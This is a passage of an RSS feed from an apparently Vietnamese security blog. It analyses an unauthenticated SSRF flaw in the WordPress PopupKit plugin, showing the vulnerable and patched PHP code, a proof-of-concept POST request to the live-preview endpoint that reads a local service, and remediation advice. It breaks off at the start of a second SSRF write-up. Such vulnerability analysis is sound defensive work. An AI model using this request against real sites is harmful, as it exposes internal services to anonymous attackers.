0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;PopupKit&lt;/strong&gt;: &lt;strong&gt;2.1.3&lt;/strong&gt; (vulnerable) và &lt;strong&gt;2.1.5&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Vì 1 phần mã nguồn đã được vá trong phiên bản &lt;strong&gt;2.1.4&lt;/strong&gt; nên ta sẽ sử dụng phiên bản &lt;strong&gt;2.1.3&lt;/strong&gt; để phân tích.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function get_routes(): array {&#xA;    return [&#xA;        [&#xA;            &amp;#39;endpoint&amp;#39;            =&amp;gt; &amp;#39;/live-preview&amp;#39;,&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; &amp;#39;fetch_external_content&amp;#39;,&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; &amp;#39;__return_true&amp;#39;,&#xA;        ],...&#xA;    ];&#xA;}&#xA;&#xA;public function fetch_external_content( \WP_REST_Request $request ) {&#xA;    $url = $request-&amp;gt;get_param( &amp;#39;url&amp;#39; );&#xA;&#xA;    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Invalid URL&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    // Fetch the content using wp_remote_get&#xA;    $new_url  = add_query_arg( &amp;#39;preview&amp;#39;, &amp;#39;true&amp;#39;, $url );&#xA;    $response = wp_remote_get( $new_url );&#xA;    if ( is_wp_error( $response ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Error fetching content&amp;#39; ), 500 );&#xA;    }&#xA;    // Return the fetched content&#xA;    $body = wp_remote_retrieve_body( $response );&#xA;    $body = preg_replace( &amp;#39;/type=&amp;#34;[^&amp;#34;]&amp;#43;-text\/javascript&amp;#34;/&amp;#39;, &amp;#39;type=&amp;#34;text/javascript&amp;#34;&amp;#39;, $body );&#xA;    return new \WP_REST_Response( array( &amp;#39;content&amp;#39; =&amp;gt; $body ), 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản &lt;strong&gt;2.1.3&lt;/strong&gt;, plugin định nghĩa một API với POST method có &lt;code&gt;permission_callback =&amp;gt; __return_true&lt;/code&gt;, cho phép &lt;strong&gt;mọi người dùng&lt;/strong&gt;, bao gồm cả &lt;strong&gt;anonymous user&lt;/strong&gt;, thực thi hàm &lt;code&gt;fetch_external_content()&lt;/code&gt; với tham số &lt;code&gt;url&lt;/code&gt; bắt buộc.&lt;br&gt;&#xA;Hàm này sử dụng &lt;code&gt;wp_remote_get&lt;/code&gt; để gửi request đến URL được truyền vào và trả lại nội dung phản hồi (response body).&lt;/p&gt;&#xA;&lt;p&gt;Do không có bất kỳ cơ chế kiểm soát hoặc lọc URL nội bộ nào, điều này khiến kẻ tấn công có thể gửi request đến các dịch vụ nội bộ (internal services) dẫn đến lỗ hổng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; có thể khai thác bởi &lt;strong&gt;anonymous user&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function get_routes(): array {&#xA;    return [&#xA;        [&#xA;            &amp;#39;endpoint&amp;#39;            =&amp;gt; &amp;#39;/live-preview-template&amp;#39;,&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;GET&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; &amp;#39;fetch_external_content&amp;#39;,&#xA;        ],...&#xA;    ];&#xA;}&#xA;&#xA;public function fetch_external_content( \WP_REST_Request $request ) {&#xA;    $url = $request-&amp;gt;get_param( &amp;#39;url&amp;#39; );&#xA;&#xA;    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Invalid URL&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    // Fetch the content using wp_remote_get&#xA;    $new_url  = add_query_arg( &amp;#39;preview&amp;#39;, &amp;#39;true&amp;#39;, $url );&#xA;    $response = wp_safe_remote_get( $new_url );&#xA;    if ( is_wp_error( $response ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Error fetching content&amp;#39; ), 500 );&#xA;    }&#xA;    // Return the fetched content&#xA;    $body = wp_remote_retrieve_body( $response );&#xA;    $body = preg_replace( &amp;#39;/type=&amp;#34;[^&amp;#34;]&amp;#43;-text\/javascript&amp;#34;/&amp;#39;, &amp;#39;type=&amp;#34;text/javascript&amp;#34;&amp;#39;, $body );&#xA;    return new \WP_REST_Response( array( &amp;#39;content&amp;#39; =&amp;gt; $body ), 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong bản vá &lt;strong&gt;2.1.5&lt;/strong&gt;, plugin đã thực hiện một số thay đổi nhằm giảm thiểu nguy cơ &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Đổi endpoint&lt;/strong&gt; từ &lt;code&gt;/live-preview&lt;/code&gt; sang &lt;code&gt;/live-preview-template&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Thay thế hàm &lt;code&gt;wp_remote_get()&lt;/code&gt; bằng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt;, giúp WordPress &lt;strong&gt;tự động chặn các request đến địa chỉ nội bộ&lt;/strong&gt; như &lt;code&gt;localhost&lt;/code&gt;, &lt;code&gt;127.0.0.1&lt;/code&gt;, hoặc &lt;code&gt;169.254.*&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nhờ vậy, các yêu cầu từ người dùng đến tài nguyên nội bộ của máy chủ sẽ bị chặn, ngăn chặn khả năng khai thác SSRF.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Hàm &lt;code&gt;get_routes()&lt;/code&gt; được gọi bên trong &lt;code&gt;register_routes()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected $namespace = &amp;#39;pbb/v1&amp;#39;;&#xA;&#xA;public function register_routes() {&#xA;    $routes = $this-&amp;gt;get_routes();&#xA;    foreach ($routes as $route) {&#xA;        register_rest_route(&#xA;            $this-&amp;gt;namespace,&#xA;            $route[&amp;#39;endpoint&amp;#39;],&#xA;            [&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; $route[&amp;#39;methods&amp;#39;],&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; [$this, $route[&amp;#39;callback&amp;#39;]],&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; isset($route[&amp;#39;permission_callback&amp;#39;])&#xA;                    ? $route[&amp;#39;permission_callback&amp;#39;]&#xA;                    : [$this, &amp;#39;permission_callback&amp;#39;],&#xA;            ]&#xA;        );&#xA;    }&#xA;}&#xA;&#xA;public function permission_callback(): bool {&#xA;    return current_user_can(&amp;#39;manage_options&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi &lt;code&gt;register_routes()&lt;/code&gt; được thực thi, tất cả các route được trả về từ &lt;code&gt;get_routes()&lt;/code&gt; sẽ được đăng ký vào WordPress REST API thông qua hàm &lt;code&gt;register_rest_route()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Ở đây:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Mỗi route sẽ ánh xạ tới một &lt;code&gt;endpoint&lt;/code&gt;, &lt;code&gt;method&lt;/code&gt; và &lt;code&gt;callback&lt;/code&gt; tương ứng.&lt;/li&gt;&#xA;&lt;li&gt;Nếu route không có khóa &lt;code&gt;permission_callback&lt;/code&gt;, plugin sẽ tự động gán mặc định là &lt;code&gt;$this-&amp;gt;permission_callback&lt;/code&gt;, yêu cầu người dùng phải có quyền &lt;strong&gt;manage_options&lt;/strong&gt; (thường chỉ có admin).&lt;/li&gt;&#xA;&lt;li&gt;Tuy nhiên, trong phiên bản &lt;strong&gt;2.1.3&lt;/strong&gt;, route &lt;code&gt;/live-preview&lt;/code&gt; lại được khai báo thủ công với &lt;code&gt;permission_callback =&amp;gt; &#39;__return_true&#39;&lt;/code&gt;, nghĩa là &lt;strong&gt;bỏ qua cơ chế kiểm tra quyền&lt;/strong&gt; ở trên, dẫn đến việc bất kỳ ai (kể cả anonymous user) cũng có thể gọi API này.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi gửi yêu cầu &lt;strong&gt;POST&lt;/strong&gt; đến endpoint &lt;code&gt;/wp-json/pbb/v1/live-preview&lt;/code&gt;, hàm &lt;code&gt;fetch_external_content()&lt;/code&gt; sẽ được thực thi. Hàm này nhận giá trị &lt;code&gt;url&lt;/code&gt; từ tham số yêu cầu, thực hiện &lt;strong&gt;fetch request&lt;/strong&gt; tới địa chỉ đó và trả về &lt;strong&gt;body&lt;/strong&gt; của phản hồi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo local service đơn giản bằng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;metadata&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi POST request đến endpoint&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/pbb/v1/live-preview HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;url=http://localhost:8001/metadata&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-27-cve-2025-10861/result.png&#34; title=&#34;Nội dung đọc được từ local service&#34; data-thumbnail=&#34;/posts/2025-10-27-cve-2025-10861/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Nội dung đọc được từ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-27-cve-2025-10861/result.png&#39; alt=&#34;Result&#34; height=&#34;398&#34; width=&#34;1543&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nội dung đọc được từ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phiên bản &lt;strong&gt;≤ 2.1.4&lt;/strong&gt; của &lt;strong&gt;PopupKit&lt;/strong&gt; có lỗ hổng &lt;strong&gt;SSRF&lt;/strong&gt;: endpoint &lt;code&gt;/wp-json/pbb/v1/live-preview&lt;/code&gt; cho phép &lt;strong&gt;anonymous&lt;/strong&gt; gọi &lt;code&gt;fetch_external_content()&lt;/code&gt; với tham số &lt;code&gt;url&lt;/code&gt; từ client; hàm này dùng &lt;code&gt;wp_remote_get()&lt;/code&gt; và trả về trực tiếp phần body, do đó có thể bị lợi dụng để truy vấn các dịch vụ nội bộ. Bản &lt;strong&gt;2.1.5&lt;/strong&gt; đã chuyển sang &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; và giới hạn quyền truy cập (chỉ admin), giúp giảm rủi ro.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cập nhật&lt;/strong&gt; lên &lt;strong&gt;2.1.5+&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không tin URL client&lt;/strong&gt; — xác thực/allowlist trước khi fetch.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Dùng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt;&lt;/strong&gt; và kiểm tra thêm (redirects, DNS).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không dùng &lt;code&gt;permission_callback =&amp;gt; __return_true&lt;/code&gt;&lt;/strong&gt;; giới hạn quyền.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không trả nguyên body thô&lt;/strong&gt; nếu không cần thiết.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/popup-builder-block/vulnerability/wordpress-popup-builder-with-gamification-multi-step-popups-page-level-targeting-and-woocommerce-triggers-plugin-2-1-4-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress PopupKit Plugin &amp;lt;= 2.1.4 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-36679 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-23-cve-2023-36679/</link>
      <pubDate>Thu, 23 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-23-cve-2023-36679/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-23-cve-2023-36679/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng Server Side Request Forgery (SSRF) đã được phát hiện trong plugin WordPress &lt;strong&gt;Spectra&lt;/strong&gt; (trước đây gọi là &lt;strong&gt;Ultimate Addons cho 